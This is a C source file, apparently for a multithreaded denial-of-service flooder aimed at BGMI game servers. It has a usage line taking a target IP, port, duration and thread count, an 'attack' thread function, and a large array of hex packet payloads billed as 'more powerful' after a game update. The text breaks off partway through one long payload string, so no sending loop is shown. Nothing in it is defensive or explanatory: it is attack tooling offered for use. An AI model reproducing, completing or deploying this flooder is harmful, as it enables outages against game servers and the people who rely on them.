#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./IPxKINGYT ip port time threads\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = {
        "\x17\x03\x03\x00\x72\x00\x00\x00\x16",
        "\x1f\x03\x03\x00\x9c\x72\x45\x3e\x23\x5d",
        "\x27\x2f\x00\x5a\x66\x23\xaf\x73\x4e\x92",
        "\x33\x62\x03\x01\x5d\x7e\x8a\x2c\x39\x0d",
        "\x41\x53\x7e\x03\x9d\x00\x00\x16\xaa\xbb",
        "\x5b\x7f\x14\x63\x2a\x19\x00\x9e\xde\x8f",
        "\x6e\x29\x03\x17\x6d\x53\x02\x47\xec\x5b",
        "\x7c\x83\x47\x5d\x32\x10\x48\x7f\x2b\x1e",
        "\x9a\xfe\x2b\x76\x13\x45\x21\xdc\xbe\xaf\x99\x74\x23\x90\x1e\xaa",
        "\xa7\x03\xfe\x10\x5e\x72\x6a\x00\x3b\x89\xdf\x4c\x12\x9a\xfe\xdc",
        
        "\x17\x03\x03\x00\x72\x00\x00\x00\x16",
        "\x1f\x03\x03\x00\x9c\x72\x45\x3e\x23\x5d",
        "\x27\x2f\x00\x5a\x66\x23\xaf\x73\x4e\x92",
        "\x33\x62\x03\x01\x5d\x7e\x8a\x2c\x39\x0d",
        "\x41\x53\x7e\x03\x9d\x00\x00\x16\xaa\xbb",
        "\x5b\x7f\x14\x63\x2a\x19\x00\x9e\xde\x8f",
        "\x6e\x29\x03\x17\x6d\x53\x02\x47\xec\x5b",
        "\x7c\x83\x47\x5d\x32\x10\x48\x7f\x2b\x1e",

        // New more powerful BGMI 3.4 payloads after 5MB update
        "\x9a\xfe\x2b\x76\x13\x45\x21\xdc\xbe\xaf\x99\x74\x23\x90\x1e\xaa",
        "\xa7\x03\xfe\x10\x5e\x72\x6a\x00\x3b\x89\xdf\x4c\x12\x9a\xfe\xdc",
        "\xb1\x19\x8f\x2a\x45\x77\x10\x3e\x23\xfd\xaa\x01\x7e\x92\xcb\x5f",
        "\xc8\x23\x7a\x4f\x56\x9e\x12\xad\xba\x77\xff\x98\x3b\x67\x2c\x88",
        "\xda\x01\x03\x19\x5f\x2b\x6a\x77\x4d\xbe\xef\x3e\x23\x49\xaa\xdc",
        "\xe2\x6f\x9d\x32\x41\xcb\xaf\x75\x88\x0d\x1a\x4e\x7f\x23\x3b\x0c",
        "\xf1\x24\xab\x03\x5e\x72\x2a\x44\x6e\x5d\x8f\x9a\x12\x10\x9d\xcb",
        "\x12\xdf\x6a\x22\x33\x8b\x77\x41\xde\x23\x99\x7f\xaa\x6e\x19\x2b",
        
        "\x0a\x6b\x6d\xbe\xc5\x22\xa0\x27\xd4\x30\x13\x59\xaf\x54\xa6\xc8\xb5\x52\xa2\x19\xb5\xcd\x7a\xd7\xd4\xac\x58\xd4\x1c\x15\xa6\xc2\x98\xb4\x00\xb9\x23\x2a\xcf\x09\x9b\x4d\x42\x6f\x07\x54\x52\x85\x28\xed\x8b\x1d\x36\x5c\x87\xf4\xf2\x6c\x1b\x1b\xcf\xb0\xe0\x57\x09\x29\x20\x21\x54\xc4\x90\xac\xdf\x58\x5f\x42\x0b\xd0\x11\xcd\xbd\x21\xa4\x20\x11\xf0\xc1\x4f\xe1\xd6\x18\xf8\xb1\xc3\x74\xdd\x45\x23\x4c\x32\x6d\x99\xd7\x7d\x95\xa9\x42\xb1\x21\xad\x68\xa1\xa9\xad\x4f\x3e\xdd\x90\x17\xe1\xa5\x38\x73\x7b\xea\x4b\xbd\x37\x3f\xf1\xed\x43\x0a\xc8\x1d\x5b\x72\x12\x2a\xaa\x98\x46\xdf\x32\x40\xbf\xc5\x9d\x92\xd5\x70\x08\x35\x8e\x2f\x80\xe5\x51\xec\xa4\x24\xd6\xa5\x0a\xa2\xf7\x80\x6a\xce\x8e\x1f\x34\x31\x3d\xbc\x8d\xd3\x7c\x48\xa6\xa2\x08\x4d\x79\x5e\xc5\xcb\x63\xfd\x64\x55\x65\x74\x89\xd6\x87\x0a\xb3\x25\x63\xce\x20\x82\x00\x17\xa0\xe0\x20\xaf\xda\xef\x85\xcf\xd1\xbc\xb8\xdf\x8a\x09\x40\xe5\x36\xfc\xe5\xd9\x7d\x8e\xc7\x93\x87\x7f\xaa\x20\x70\xca\xc4\xb7\x24\xc0\x4c\x05\xec\xf8\xee\x34\xf3\xe6\x59\xed\x87\x31\x12\xea\x7e\xcb\x82\xae\xbf\x8c\xd0\x52\x03\x8a\x20\xf5\x69\x73\x68\x51\x10\x46\x31\xff\xaa\xb8\xff\xbe\xfa\x09\x14\x8f\xe3\xaf\x43\x31\x06\xaf\x25\xd0\xad\x89\x52\x69\x43\xf6\x5c\x91\xf1\xa3\x33\xad\x45\x47\xf7\x04\xae\xb9\xb3\xfa\x17\x22\x59\x76\xcf\x1a\x1a\x76\x2b\x30\x87\x0d\x1a\x8e\xeb\xc6\x28\x7a\x3b\x0e\x05\xff\x75\x06\x9e\x70\x62\x8e\xa2\x53\x72\xc9\x4b\xb5\x34\x65\xad\xed\x0d\x61\x46\xa5\xbf\x94\x10\xdd\x98\x68\x36\xc8\xe2\xdc\x21\xa5\x80\xc8\xe8\x28\x0f\xff\xe0\xee\x70\x81\x4c\x36\x2d\x92\xfa\xde\x60\x11\xea\x0b\xd9\x7e\x81\x85\xca\x8d\xb5\x59\x56\x5e\x50\xa8\x80\x17\x2d\xcc\x05\x59\x9d\xd3\x56\x5b\x0a\x7b\x8b\x26\x04\xcf\xdd\xf6\xe7\xda\xd4\x10\x8e\x59\x09\x7c\x3c\x2a\xa6\x7f\x5c\x09\xcf\x64\xdc\xd0\xba\x66\x58\x2c\x1e\x5c\x60\x42\xa4\x66\xaf\x5e\xf0\xad\x39\xdc\x45\x67\x9b\x07\xff\x61\x42\x8a\x0e\xa2\xa6\x88\x80\x0a\x07\x3d\xaa\xdf\xd9\x20\x75\xf5\x26\xa9\x31\x36\x49\x5d\xa8\x94\x67\x1c\x6b\x8d\xce\x71\xe1\xd7\x86\x55\x41\xfe\xd5\x37\x4d\x7d\xb0\x94\xea\xc4\xb7\x09\x59\x28\x90\xd5\xcf\x06\x96\x1a\xb6\x91\x9e\x59\x34\x6d\x60\xce\x87\xd6\x6a\x01\x27\x8f\xeb\xeb\x6c\x85\xc2\x46\xad\x5e\x24\x8b\x0e\xa4\x0f\xcc\x4f\xca\x3a\xa0\x4e\x2c\x73\x9c\x4d\xd6\x89\x98\x13\x2d\x21\x34\x04\x8d\x73\x3c\x5e\xe0\xb0\x56\xef\x89\x4c\x12\xd1\xdd\x61\xdb\x18\x29\xda\xf2\xc6\xe7\xed\x79\x9c\x11\x8f\x59\xa7\x1f\x53\xaa\xd8\x53\x18\x87\x8a\xb0\xf7\x32\x31\xb2\xb8\xc4\x1f\xef\x45\x99\x0c\xf2\x09\x17\xce\x82\x5f\xe4\xb3\x2f\x76\x71\x9c\xdc\x9c\x78\xc9\xf1\x6f\x69\x63\xeb\x57\x31\x3f\x46\x32\xf2\x8a\xbd\xdd\xce\x65\x4d\xc3\xf5\x70\x44\xcc\x65\x2c\xde\x40\xa0\x0d\xd8\xff\x2a\xc0\x65\x90\x33\x65\x5f\x66\x53\xfc\x57\xb4\x3b\xa2\xb9\x7c\xd4\xc6\x00\x6f\x6f\x13\x54\xa3\xd6\xaf\xea\x8a\x16\x38\x56\xa3\x2b\x52\x75\xb4\x6d\xeb\x4c\x76\x0f\xf2\xe5\x80\x82\xc5\xd2\x2c\xc2\x31\x17\x9d\x6d\x69\xec\xd9\x25\x33\xc3\x6b\xbb\x3f\x3d\xae\x48\x59\xc6\x89\xb3\xea\x0b\x86\x81\x1c\x6f\xd3\xbf\x19\xb5\x18\x5a\x02\xa5\x97\x6b\xb5\xbe\xa7\x24\xdc\x66\x0d\xbb\xea\x35\xd9\xd4\xfd\x83\x97\xfe\xbf\xe5\x73\xa8\x72\x5f\xd0\xe5\xed\xb4\x60\x59\x87\x38\x35\x4b\x6b\x34\x07\x61\x77\x31\x6f\x75\xf7\xe6\x71\x34\x21\x3a\x83\xe2\x8d\x53\x79\x9c\x9a\x34\x3e\xd7\xf5\xbf\xe0\xf0\xd0\x5b\x83\x8a\x74\x63\x5a\xef\xdf\xde\x16\x20\x65\x39\xfb\x61\x28\xb6\xba\x4d\x1e\x2b\x45\x2b\x98\x2d\x47\x12\x7d\x27\xa1\xf8\xb4\x55\xf1\x9c\xbc\xa6\x39\x7d\x8e\x93\xff\x5b\x86\x44\x53\xfd\xbc\x76\xea\x37\x00\x1c\xb7\x9c\xba\x26\x9e\x65\xda\x08\x1e\xb2\xb9\xd9\xe8\x33\x87\xf8\xb8\x04\x93\x85\x70\xe6\x0b\xbb\x4c\xa3\x96\x37\xc9\x7f\xef\x8e\x5a\x03\x66\x9b\xc4\x7f\xfc\x14\x45\x8f\xb7\xc8\xf7\x8d\xfd\x3a\x32\xf1\x9a\x4d\xbe\x41\xd0\xcc\x32\x4c\x42\xf4\xe1\x21\xb4\xd3\x67\xb2\x37\xa1\x17\x98\xce\x82\xb5\x2e\x5e\xc2\xc9\x65\x22\x66\xc8\x60\xb3\x04\x53\xb0\xa0\xc6\x37\x67\xaf\x0d\x54\x4c\x16\x67\x7f\x43\x18\xe0\x7f\x8a\xdf\xee\xce\xa2\xee\xe3\x94\x53\x9a\xd9\x94\x4d\x70\x0c\xfa\x0e\x59\x76\x09\x4e\xc7\xbc\x9c\x9e\x66\x7b\xe3\xad\xd8\xb6\x62\x01\x0e\x91\x78\x78\x30\x7f\x00\x2c\xad\x09\xdd\xce\x4f\x8f\x86\x12\xef\x5a\x59\xb2\x0a\xd2\x5e\x70\xf1\x25\xb8\xc3\x08\x86\x3d\xba\x49\x5e\x4a\xc2\xa5\x70\x28\x77\x6c\xeb\x71\xfa\xda\xe1\xd2\x6c\x19\x51\x1c\xbc\xa1\xe5\x13\x23\x17\xd9\x42\xdf\x4a\x5a\xc3\xfd\x3a\x95\x13\x85\x6a\x68\x70\x99\xca\xa7\x2f\xc1\xa2\xd5\xfb\x69\x8b\x16\xb0\xd9\xec\x72\xee\x55\xd3\x9b\x15\x06\x9e\xff\x1d\x71\x85\xb1\xc8\x41\x52\x88\x73\xdf\x87\x26\xe5\x27\x18\x39\x17\x24\xb8\xc1\x34\xb8\xe2\x87\x1d\x55\x5a\x2b\x04\x39\x01\x89\xa7\xe3\xae\x3f\x2b\xe9\x6b\x6e\x35\xc7\x23\x60\x2d\xa9\xa6\x88\xb5\xf6\x7b\x00\x8c\xa3\xab\x8a\x53\x6e\x0c\x77\xc2\x08\x15\x32\x54\x2e\x49\x99\x6d\xf3\xa2\xa7\x21\xf2\xde\x67\xc8\x4b\xb0\xad\x9c\x62\x8b\xd4\x1e\x58\xb6\x12\xaa\xf8\xbe\x19\x92\x0c\xe1\xa9\xf2\xf0\xed\xb3\x51\x20\x5b\x4e\x02\x7d\xaf\xd2\xef\xf0\xf3\x41\xd0\x6a\x92\x36\x12\xfa\xcc\x9d\xed\x7a\x64\x79\x58\x6e\xb7\xb7\xa8\xc5\x35\xdb\xd5\x09\x59\xf2\x45\x46\x19\x41\x45\x8d\xa6\x19\xef\x7d\x48\x5f\xad\x18\x60\xc5\x9e\xb7\x86\x8e\x31\xe0\x1a\x99\x0c\xa9\x65\x48\x08\xa4\x6a\x46\x8d\x4f\x0f\x39\xd9\x69\x7f\x3b\x5b\x1c\xd6\xe7\x98\x8a\x6a\x1e\x0b\xc1\xbd\x4f\xc5\xc3\x2b\x00\x00\x54\x69\x52\xa9\xe0\x15\xb9\xef\x76\x1e\xb8\x3f\xda\x9a\x42\xc4\xa6\xa7\x7a\xa9\x4b\x62\x5d\xf5\x2d\xd6\xae\xa2\x52\xf4\xe7\x4e\x87\x21\xb1\x8b\x6d\xbf\xc7\x31\x44\x73\x01\x1e\xdb\xc6\x9d\x60\x69\xc2\x42\x61\xdf\x71\x5e\xe9\x2c\xb7\x5d\x12\xa5\xfc\x98\x55\xba\x75\x82\x5d\x77\x83\xe0\x92\x78\x43\xc0\x55\x98\x29\xdc\xb8\x38\xb5\x68\x22\xa7\x9f\xed\xad\xfd\x29\x77\x5c\x14\x54\x4e\x81\x75\x87\x26\x0b\x83\x8e\x4e\x1c\x59\x35\x69\xad\x8c\x54\x61\x56\xb2\x23\xc3\x60\x77\x59\xb2\xc4\x2b\xcd\xf3\x24\xba\xcb\x47\x55\x53\x3e\x43\x9a\xab\xd5\xff\x34\xc3\xe6\x1d\x67\x32\x99\x40\xdf\xea\xd7\xc1\xc5\x32\x7a\xfd\xef\xb3\xc8\xe3\xd4\xb3\x37\x49\x37\x30\x1f\x29\xe4\x89\xbf\x31\x7b\x4b\xa5\xf3\xd6\x54\x3f\xe2\x8c\x14\xbb\x2b\x23\x75\x16\x4c\x86\xef\x00\xe9\x62\x67\x89\xa6\x6b\x20\x70\x6b\x95\x22\x10\x2d\x96\xb9\x11\x49\xd0\x18\xd1\x99\x56\x27\x01\x97\x8b\x0c\xe3\xaa\x36\x5e\x4b\x1a\x7e\x3d\xae\x5f\xc7\xb1\xc0\x87\x4e\x30\x63\x08\x10\x87\x51\xf3\xa8\x87\xaf\xe8\x07\x09\x9e\x9b\x76\xc1\xc9\x18\x71\xc7\xc3\x80\xeb\xd3\xdf\xc3\xd7\x0c\x06\x15\xa0\x09\x7b\xcc\xa7\x82\xd0\x96\xfb\xc2\x53\xf3\xf2\x7f\x65\xf6\xc6\x83\x32\xc9\xc5\x43\xdc\xf0\xa0\x72\xc9\x66\xf2\xa4\xc7\x11\xe5\xa9\xee\x8b\xd4\xf3\x59\x1c\xee\xab\x26\x57\x9d\x72\x86\x13\x18\x77\x82\x28\x0d\x49\x5d\x65\x38\x49\x08\xce\xf0\x05\x21\xf7\xd6\x4e\xb4\x0c\x79\x0c\xee\x67\x12\x5c\x06\xa9\x57\x45\x63\x0c\xdc\x75\x53\x69\xf3\x23\x24\x90\x40\x78\x2d\x47\x3d\x47\x38\x17\x8d\x3f\x7d\x6b\x7a\xf7\x90\x4d\x66\x07\x4c\xad\x2b\xd7\x2a\x43\xd2\x4c\x6e\xac\xe3\x29\x5f\xba\x9b\x31\x65\x8e\x3c\x6d\x90\xac\xab\xe1\xbe\xfe\x41\xc9\x65\x5d\xeb\x7d\xa6\x50\x09\x82\xb5\xc8\x37\x1d\xd4\x37\x4d\x2f\xdc\x4e\x3d\xa7\x3e\xe9\x3c\x2f\x85\x43\x78\x9e\xb3\x63\xa5\x13\xb2\xdd\x3e\xd4\xdc\x3d\xc7\x3e\xed\x2c\xb6\xa2\x35\x09\x17\x51\x7f\x66\x0e\x39\xd4\x44\x00\xa2\xf6\x6a\x4a\x18\xec\xf9\x1c\xcb\x34\x6d\x92\x16\xbc\xf8\x21\x67\xd9\xa4\x07\xf1\xa4\xcf\xaa\x34\xf6\xe0\x3a\xd4\xab\x66\xbe\xb1\xdd\x49\x80\xdc\x70\x6a\xfd\xc3\x7e\x92\x8e\x6d\xb6\xed\x3c\x52\xb0\x9e\x3e\x27\x0e\x81\xe2\x0e\x75\x39\x7e\x86\x62\x06\x0f\x38\x43\x94\xfe\x4b\x5e\x17\xbc\x63\xb8\x3b\x7d\x42\xcf\xe8\xe9\x7d\x21\x9c\x3f\xe3\xdc\xcb\x7f\x88\x4d\x47\x13\xf3\x9e\x79\xa9\x36\xc0\x75\xbd\x48\xba\x91\x7b\x9e\xb1\x64\x8e\x9f\x28\x68\xe5\x70\xfd\x0a\x7b\x11\xe7\xc5\x9f\xa6\x57\xc5\xc5\x40\x43\xa0\x5b\x89\xe8\xab\x16\xaf\x20\x76\x4e\xd2\x41\x7e\x47\xd7\x31\x06\xc8\x4a\xc6\x4a\x28\x0d\x5a\xc3\xe3\xe7\x34\xcc\xe7\x22\x9a\xb9\x9b\x76\x91\x39\xb8\x57\xc5\xd8\x9d\x27\x57\x34\xac\xe2\xf5\x80\x66\x56\xaf\xfa\x0d\xf0\x12\xdc\x93\xc0\xc5\xbe\x49\xce\x24\x2e\xbb\x6d\x9c\xbd\x85\x51\x92\xb0\xc3\x6f\x0c\x5a\x5b\x64\xa4\xb0\x46\x69\x4e\xd0\x14\x98\x6d\x70\xd1\x30\x67\xb1\xb7\x7b\x56\xb8\x49\xd2\x7c\xd8\x52\x71\x69\x80\xc9\xb8\x57\x3a\xf1\x41\xc6\x51\xd2\x74\xdc\x19\xf5\x44\x8d\xa2\x43\x24\x42\xac\x49\xea\x2c\xba\xfb\x38\xef\x49\x42\x02\x37\x64\x20\xa3\x9a\x5d\x25\xbc\x01\x8c\x59\xd4\x07\x5a\x2a\x76\x8a\x7a\x71\xe7\x1f\x17\x09\xb9\x5c\xd8\xcb\xc8\x34\xe1\xec\x60\xe8\x52\x22\x40\x83\x21\x27\xce\x75\x04\x41\x84\x15\x5b\xae\xc6\x90\x26\x04\xd7\xf6\x5a\x22\x7b\xe4\x19\x1d\x09\x2c\x98\x0f\x6d\xdf\x2f\xc5\x68\x03\x71\x64\xad\x75\x4d\x31\x27\x12\xbb\x4c\x5a\x9a\x4c\x07\xe9\xee\xd3\xc8\x7d\xf0\xae\x04\xcd\x0f\x7f\x37\x61\x12\x8b\x85\x37\xbe\x83\xf1\x8a\xa1\x41\xa9\x75\xc4\xfd\x60\x10\x6a\x9e\x27\x76\x61\x87\x67\xcd\x96\x70\x12\x9e\xa6\x29\xa4\x3e\x02\xaa\xf1\xeb\x92\x45\xa4\xda\xb9\x11\x73\xbc\x36\xb5\x95\x81\x08\x0c\x08\x89\x05\x25\xb9\x71\x15\x51\xb8\xa2\x9b\x18\xc6\x20\x8e\xa8\x9a\x7f\x19\xd4\x4c\x6d\xa7\x90\x3a\x1f\x84\xe6\x3f\xc8\x14\xae\x16\x22\x55\xe1\x63\x49\xe2\xbc\x3b\x7e\x0a\x33\x48\x17\x7f\x5a\x90\x2d\x07\x96\x4e\xd0\x96\xc9\x6a\xfd\x3b\x6d\x44\x40\x53\x05\xd9\x90\x8d\x8d\xf0\x21\xab\x06\x77\x71\xd1\x58\x5f\x8b\xfc\xfd\x0f\x45\xa6\xd1\x90\x8b\x51\x55\x3a\x73\x0c\xe6\x60\x8a\xa5\xcc\x23\x16\xa1\xbf\xa6\xc6\x53\x23\x78\xc0\x0f\x28\xb8\x02\x92\xf8\x21\x6b\x71\x18\x2b\xa1\x7f\xac\xd8\xc8\xc7\x01\x66\xe8\x84\x3f\x47\xf8\x6a\xde\xf4\x7b\x1a\x3a\x66\x7b\xcb\xed\x67\x76\x8b\x3f\x00\x81\x35\x84\x33\x2c\x9e\xac\xa8\x28\x6c\xd3\x64\xd8\x36\xb3\x24\x27\xf0\x42\x32\xe6\x11\x39\x11\x94\xa2\x38\xd8\x84\x15\x5f\x3d\xdd\x46\x3f\xcc\x07\x53\x27\x2c\x40\x97\x0e\x68\x93\xb9\xf2\x51\x59\xa3\xd1\xe4\x87\x7e\xa8\x30\xa3\xc6\xef\x8f\xa0\x7b\xa8\x88\x8a\x97\x07\x96\x7d\xca\xe5\x4e\xd1\x67\xff\x5b\x9a\xad\x58\x7c\x16\xa9\xca\x70\x4d\x0a\x6c\xba\x10\x44\xf9\x4e\x62\x3d\xdf\xaf\xfb\x5c\xc6\x0f\x1d\xcb\x5c\x87\x77\x27\x3e\xcc\x95\x32\x34\x6c\xb8\x97\x9d\x9b\x82\x1b\xa4\x67\x72\x5e\x65\x6f\x75\x15\x4f\x29\x48\xdb\xd7\xbc\x0e\xb3\x3f\x9d\xfe\x67\x77\xdc\x8e\x56\xe9\x77\xbb\x41\xb9\xf5\x07\x57\xa9\x8e\xd6\x05\x75\xea\x3e\x24\xc2\x6f\xdb\x78\x88\x30\x06\xd2\x07\x85\x0e\x22\x0f\x6c\x5b\x1a\x08\x03\x22\x1b\x6b\x2a\x1a\x6d\x78\x60\x69\x32\x5b\x02\x45\xe0\x08\x94\xe3\x0b\xb6\xfb\x03\x94\x78\x01\xbc\x93\xd6\x1c\x33\x9b\x1a\x3a\xd3\x79\x7a\x78\x05\xc9\xa4\x10\xee\x0d\x8c\x1c\x82\x63\x78\xbe\xc7\xf2\xb6\xc6\xef\xb6\x78\x62\xf9\x9d\x5e\xa6\xbb\xad\x74\xad\xc2\x72\xff\x86\xf4\x73\x8b\x2b\x09\xde\x73\x32\xd5\xfb\x59\x63\xc7\xa4\xec\x35\x53\x3d\x6d\xa3\xd3\xd5\xef\x1d\x3b\x12\x84\x95\x4f\x6c\xac\xa9\x82\x15\x47\x48\x94\xd1\xcc\x36\xcb\x22\x8a\xc7\xb8\x01\x24\x28\xbd\x7a\xb1\x2a\x8e\x09\x87\xfe\x9d\x53\x6e\xe8\x42\xc5\x43\x98\xb5\x3f\xe2\x25\xdf\x72\xd9\x85\x40\x97\x93\xcf\xbd\x83\xfc\xed\xa2\x65\xe1\x75\xc2\xe2\xf6\xbd\x3e\x53\x61\x4b\x24\x73\xad\x79\x60\x74\x52\x22\xac\xd7\x37\x03\xac\xcf\xc2\xa3\x2e\xdd\x9f\xe8\x49\xe5\x18\x22\x72\x6a\x04\x0a\xaa\x8b\x69\x44\x02\x59\x3f\xd9\x1d\xbb\x71\xaa\xbc\x72\xb4\xe0\x0a\x3c\x0b\xe8\xf6\x18\xe8\x72\x7f\x02\x5f\x11\xfd\x0f\x17\xe7\xee\x61\x76\xe4\x73\xc6\xa2\xa2\xaf\xa7\x47\xcc\x98\x41\x62\xdd\x6e\x52\x87\x02\xe0\x82\x5c\xd8\xcb\xf6\x3f\x9d\x6a\xc7\x30\x8f\x4e\xc9\x75\x8d\x35\x34\x48\x6f\xfa\xfe\xbc\xfa\x9f\x14\xd6\xb1\x98\x2c\xc6\x4b\xef\xe5\x07\x25\x6a\x47\x7a\x6e\xe0\x29\x1c\x52\x65\xf1\xdb\xa0\x3e\x98\xb6\x10\x12\xf2\x16\xb4\xe0\x96\x22\x33\x4c\xd4\x51\x56\xf6\xc6\x1c\x39\xeb\x1a\x77\x22\x71\xf5\xd6\x04\x67\x15\xcd\x81\xfe\x49\x02\x86\xa4\x2d\x80\x2c\x14\xe8\x14\xc2\xac\x08\xe2\x31\x7f\x5a\x6a\x6a\xef\xe5\x19\xe2\x85\xb6\x89\x8f\x42\x52\xef\x52\x52\x0a\x9b\xc0\x9a\x0f\xd1\x28\xc0\x7f\x6d\xbd\x7e\x77\xa7\xb4\x0e\x40\xcd\xa9\x13\x76\x5a\x3a\x1a\xe8\x30\xac\x2e\x2b\xaf\x4f\x4a\x30\xd8\x31\xc5\x9c\x25\xf3\x0e\x22\xa7\x3d\xc9\x07\x8c\xe4\xff\x7f\xb4\x70\x08\xed\x59\xe5\x42\xa8\x52\x17\x0f\x0c\xa1\x99\xc8\x4b\x83\xe2\x35\xb2\x56\x46\x20\xbf\x96\x1a\x5f\x03\x4b\x51\x37\x06\xd6\xff\xa0\x3b\xcf\x95\x91\xd9\x9b\x59\x87\x48\x9c\xd7\x32\x63\x3a\x60\x11\x5c\x83\x48\xee\x1d\x9d\xba\x86\xf4\xe4\x60\xd6\x98\xe6\xd9\xa2\xd5\x54\xbf\x5c\x97\x01\x01\x2e\xd9\x43\x81\xa0\xec\x84\xb8\x29\x29\x67\xce\xff\xbe\x8e\x71\x6f\x93\xcb\x13\xdc\x53\x28\xdf\x48\xef\xa0\x44\xff\xb0\x92\xf5\xda\x64\xb3\x77\x31\xfa\x44\x25\xeb\xd1\x18\x1f\x0e\xf0\x40\x98\xc8\xe0\x0a\xec\xb3\xf5\x7a\xc9\xe3\x1c\xba\x13\xf0\xf9\x5f\xc7\x37\x25\x67\x0f\xbb\x9b\xbe\xf7\xd3\xf9\x8d\xf6\x18\x68\x8b\xaf\x13\x3f\x45\x61\x9e\x2b\xfc\xe8\x20\x20\xa0\xe7\x3a\x92\xfc\x36\x0b\x53\xb2\xd1\x29\x3e\xe4\x8e\x65\xf7\xff\x7e\x77\xc9\x5b\xf4\x41\x22\xc1\x0e\x5f\xc2\xdf\xb7\x9e\x59\xb6\xb1\xe3\xd0\x1d\xb1\xcf\xd4\x72\x86\x44\x0d\xe9\x38\xdf\x6d\x4c\xc9\x7c\x2e\x1a\x51\x55\x51\xf6\xd7\x55\xf1\xa2\x60\x36\x39\xe5\xd2\x06\x47\x29\x32\xc2\x25\x9f\x94\x74\xbb\xaa\xa5\xf2\x92\x71\x52\x6e\x92\x8f\x23\xae\x0a\xa3\x6c\x65\x16\xd2\xc9\xae\x6e\x43\xb5\x16\x49\x90\xc9\x2e\x55\xa4\xd3\xf3\x53\xd5\x2d\x7d\x0d\xe0\x97\x18\xac\xb6\x5b\x9e\xf0\x2d\x11\x91\xb1\xa8\x7f\x3b\x32\x72\x42\x13\x41\x3b\x6c\x1c\xe0\x95\xaf\x00\x13\x18\xf7\x27\x85\x11\xec\xa3\xf7\x54\x1b\xf9\xc9\xfc\x89\x21\x01\x67\xa7\x39\xee\xa2\x79\x0b\x82\xe7\x2c\xbf\xb7\x19\xdc\x7b\x7a\x47\xf6\xcf\x6c\x73\xb8\xca\x90\x56\xb9\x04\x85\x97\x51\x80\xc5\xf3\xa1\xd2\x2e\x22\x4c\xce\xba\x49\x38\x68\xd6\x52\x92\x09\xf8\x23\x79\x31\xc8\x57\x76\x20\xcd\xf9\x36\x56\xea\xa4\x90\xe6\x54\x33\x79\x3d\x11\xb1\xb8\x9d\x75\xdc\xc4\x90\xdc\xaa\x0b\x4c\x8e\x67\xcf\x22\xf0\x16\x27\x1c\x9d\xdd\x7d\xbd\x56\x4d\xc5\x4b\x04\x36\xc6\x5e\xf9\xa3\x01\x7f\x65\x20\xa3\x67\x37\xf1\x69\x68\x1c\xad\xd2\x95\xed\x59\x2c\x14\x6e\x27\x47\x28\xae\x2b\x39\x3f\xa5\xcd\x7a\xf7\xf5\x3f\xc4\xbc\x55\x44\x1e\x7e\xd0\xe7\x81\xfe\xff\x47\x14\x1c\x82\x01\x35\x07\xcb\xf9\x36\x6d\x70\xcb\x05\x39\x0b\x89\xee\x27\x45\x4e\xea\x31\xed\xf6\x32\x16\x4c\x22\xb4\x52\x40\xe0\x71\x9b\x92\xe6\x64\xaa\x41\x16\xda\x9a\x7b\x6c\xf6\xaa\x62\xe7\x18\x29\xde\x6b\x10\x54\x52\xf4\x6c\xf7\xb8\x03\xc1\xb2\x21\x4c\x51\xfc\xce\x45\xc1\x3c\xa5\x48\xda\x9c\x78\xc5\xc0\x8f\x94\x36\x1b\xd2\x65\xac\x57\x22\xf3\xb0\x1b\x67\xc6\x0d\x9d\xb3\xc8\x89\xe9\x9d\x74\xfd\xbb\x51\x4f\xf1\x53\x77\x4f\xb0\xe3\x6e\x42\x98\x67\x46\x3b\x04\x9e\x3d\x2c\x48\xdc\x74\x07\x75\xe4\x99\x9b\x72\x6c\x18\x11\x81\x9e\x3a\xd1\x99\xbb\xc6\xc1\x33\xb1\x2e\x25\xc6\xb1\xf3\x86\x42\xeb\xb9\x70\x52\xd7\xa9\xa8\x99\x0c\x82\xdb\x24\x80\x51\x74\x3d\x7c\x9f\xb0\x9c\x35\x83\x48\xb7\x33\x78\x21\x3a\x9a\x17\x55\xfa\x0c\x96\xd2\xd1\xf4\xb9\x37\x47\xfc\xc2\xff\x66\x5d\xdc\xb8\xb9\xaf\xdb\x9b\xb1\x68\xfd\xde\x9f\xb2\xbc\x96\x92\x05\xd6\xb9\xf9\x67\x12\xf7\x86\xb0\x06\x16\x7a\x3e\x18\x73\xf8\xbc\xf3\xd3\xe1\xbc\xbf\xd5\xb9\xd9\x04\x47\x16\x19\xba\xdf\x18\xe4\x14\x44\x69\x03\x28\xb5\x41\xca\x1c\x69\x57\xd4\x70\x2c\xff\xe8\x1a\x3a\x8e\xe2\x78\xdf\x6b\xe3\x35\xbb\xe5\xdb\xe3\x37\x1c\x7f\x48\xf0\x42\x46\xf4\x9d\x06\xbe\x8f\x84\x4b\x6c\xd9\x0e\x3d\x3e\xf2\x62\x49\xff\xb4\x41\x6b\x24\xf5\xb3\xd4\xe8\x31\xf3\x6e\x8d\x43\x1a\xeb\x94\xad\x0c\x04\x97\xf7\x72\x52\x89\x22\x63\xb5\xb2\xf4\x94\x9c\x8c\x82\x69\x1a\xa2\x3f\xdf\x4d\x39\x7f\x7f\xec\x61\x89\x10\xfc\xe3\x89\xb9\xec\x52\x00\x91\x4d\x47\xf4\x86\xa7\xc3\xdb\x08\x75\x02\xf9\xf1\x81\x72\x83\xf0\x0a\x6a\x1d\xad\x55\x3a\x61\x36\x87\xc0\x38\x4b\x07\x92\x01\x38\x3b\x4a\x9d\x14\xef\xb1\x7a\xa4\x9b\xd3\x2c\x72\x70\x54\x8e\xaa\x8d\xdf\x5b\xe6\x9e\x07\x0c\xef\x61\x60\x7b\x5c\xbc\x99\x9d\x00\x94\x7e\x55\xfa\xb9\x25\x3f\xb2\x31\xb4\x0d\x0b\xe9\x38\x54\xaf\xd8\x9e\xa0\x59\x7b\x86\x50\xc5\x63\xff\xf4\x60\xd7\xb5\x07\x6f\x82\xc5\x24\x33\x02\xd3\x9f\x7a\x1f\xb0\x4f\xda\xbb\x70\x99\xb6\x23\x8a\x57\xaa\x5d\x11\xdf\xbe\xc9\xe2\x2b\x1e\x1c\x20\x33\x1f\x46\x93\x97\xb0\xcf\xbc\x07\x78\x49\xf4\x54\xf2\xd6\x66\x4f\x6f\x61\xa2\xcb\xcf\x30\x3c\x6a\x4f\x74\xfd\xac\x26\x1f\x12\xac\xb8\xf8\x97\xe3\x92\x69\x33\xc3\x6c\x3f\x56\